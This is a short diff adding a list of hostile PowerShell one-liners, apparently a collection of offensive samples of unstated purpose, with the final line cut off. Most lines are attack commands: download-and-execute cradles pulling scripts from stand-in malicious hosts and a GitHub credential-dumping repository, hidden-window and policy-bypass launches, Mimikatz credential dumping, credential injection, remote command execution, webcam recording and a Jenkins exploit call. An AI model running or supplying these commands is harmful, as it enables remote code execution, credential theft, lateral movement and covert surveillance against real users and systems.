@@ -1,0 +1,13 @@
+Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1'
+copy-item -Path "\${remote}\C$${ShareFile}" -Destination "$Env:TEMP${LocalFile}"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-payload.ps1')"
+Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {Start-Process cmd.exe -ArgumentList "/c <command>"}
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')"
+Start-WebcamRecorder -RecordTime 10 -OutPath ${output_file}
+powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious_site.com/malicious_script.ps1')"
+Import-Module .\invoke-mimi.ps1; ; Invoke-Mimikatz -DumpCreds
+powershell.exe -encodedcommand <base64 encodedPayload>
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1")'
+Get-ChildItem -Path ${host.system.path}
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
+Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 <Cmd 'whoami 
